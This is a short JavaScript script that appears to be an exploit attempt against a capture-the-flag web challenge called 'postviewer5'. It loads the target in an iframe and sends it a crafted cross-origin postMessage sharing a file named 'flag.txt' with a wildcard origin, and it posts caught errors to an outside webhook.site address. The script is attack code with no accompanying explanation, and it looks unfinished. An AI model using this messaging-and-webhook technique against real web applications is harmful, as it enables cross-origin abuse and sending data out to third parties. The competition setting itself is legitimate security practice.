const WEBHOOK = "https://webhook.site/22adc411-5a6c-4d97-87b6-8c2f641bdb6c";
const URL = "https://sehrxn27-postviewer5-ff.instancer.2025.ctfcompetition.com";

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  return xhr.send(JSON.stringify(data));
}

try {
  // Create an iframe element
  const iframe = document.createElement("iframe");

  // Set the source of the iframe
  iframe.src = URL;
  iframe.style.width = "600px"; // Set width as needed
  iframe.style.height = "400px"; // Set height as needed

  // Append the iframe to the body (or any other container)
  document.body.appendChild(iframe);

  // Function to send a post message to the iframe
  function sendMessageToIframe() {
    const blob = new Blob(["toto"], { type: "text/plain" });
    iframe.contentWindow.postMessage(
      {
        type: "share",
        files: [
          {
            blob,
            cached: false,
            name: "flag.txt",
          },
        ],
      },
      "*",
    );
  }

  // Call the function to send the message
  sendMessageToIframe();
} catch (error) {
  post(WEBHOOK, error);
}
